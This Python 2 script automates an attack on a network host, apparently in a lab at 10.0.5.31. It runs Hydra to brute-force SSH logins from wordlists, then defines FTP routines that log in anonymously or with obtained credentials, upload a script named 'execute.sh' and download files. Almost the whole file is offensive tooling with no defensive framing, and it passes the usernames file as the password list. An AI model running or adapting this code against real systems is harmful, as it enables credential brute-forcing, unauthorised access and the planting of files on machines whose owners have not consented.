import os
import pexpect
import time

def kill_hydra():
	os.system("pkill -f hydra")

def hydra_spawn(ip):
	'''
	Start Hydra and find username and password for IP address
	If username and password found kill hydra 
	Execute collect data method
	'''
	try:
		print("Hydra BruteForce Being Executed")
		command = "hydra -L /home/ubuntu/Documents/usernames.txt -P /home/ubuntu/Documents/usernames.txt {} ssh".format(ip)	
		child = pexpect.spawn(command)	
		time.sleep(30)
		print("BruteForce Successfully Executed")
		child.close()
		kill_hydra()
		
	except Exception, e:
		print str(e)

	except pexpect.EOF:
		print("BruteForce Executed")
		child.close()
		kill_hydra()

#Anonymous User Methods
def execute_ftp_login_anon_user(user,ip):
	'''
	FTP directly into the machine using parameters received
	'''
	try:
		print("Anonymous Login Being Executed")
		line = "ftp -p {}".format(ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(user)
		child.expect(">")
		child.sendline("ls")
		child.interact()
		
		print("Anonymous Login Succesfully Executed")
		
	except Exception, e:
		print str(e)
		
def execute_ftp_put_anon_file(user,ip):		
	'''
	FTP directly into the machine using parameters received
	Put a file into the machine
	'''
	try:
		print("Anonymous File Creation Being Executed")
		line = "ftp -p {}".format(ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(user)
		child.expect(">")
		child.sendline("put execute.sh")
		child.interact()
		
		print("Anonymous File Creation Successfully Executed")
		
	except Exception, e:
		print str(e)	
		
def execute_ftp_get_anon_file(user,ip):		
	'''
	FTP directly into the machine using parameters received
	Put a file into the machine
	'''
	try:
		print("Anonymous File Download Executed")
		line = "ftp -p {}".format(ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(user)
		child.expect(">")
		child.sendline("get myfile.txt")
		child.interact()
		
		print("Anonymous File Download Succesfully Executed")
	
	except Exception, e:
		print str(e)		
		
#Normal User Methods		
def execute_ftp_login_normal_user(user,password,ip):
	'''
	FTP directly into the machine using parameters received
	'''
	try:
		print("Login Being Executed")
		line = "ftp -p {}".format(ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(user)
		child.expect(":")
		child.sendline(password)
		child.expect(">")
		child.sendline("ls")
		child.interact()
		
		print("Login Succesfully Executed")
		
	except Exception, e:
		print str(e)
	
def execute_ftp_put_user_file(user,password,ip):		
	'''
	FTP directly into the machine using parameters received
	Put a file into the machine
	'''
	try:
		print("File Creation Being Executed")
		line = "ftp -p {}".format(ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(user)
		child.expect(":")
		child.sendline(password)
		child.expect(">")
		child.sendline("put execute.sh")
		child.interact()
		
		print("File Creation Successfully Executed")
		
	except Exception, e:
		print str(e)	
		
def execute_ftp_get_user_file(user,password,ip):		
	'''
	FTP directly into the machine using parameters received
	Put a file into the machine
	'''
	try:
		print("File Download Being Executed")
		
		line = "ftp -p {}".format(ip)	
		child = pexpect.spawn(line)
		child.expect(":")
		child.sendline(user)
		child.expect(":")
		child.sendline(password)
		child.expect(">")
		child.sendline("get execute.sh")
		child.interact()
		
		print("File Download Succesfully Executed")
		
	except Exception, e:
		print str(e)		
			

if __name__ == "__main__":
	hydra_spawn("10.0.5.31")
	

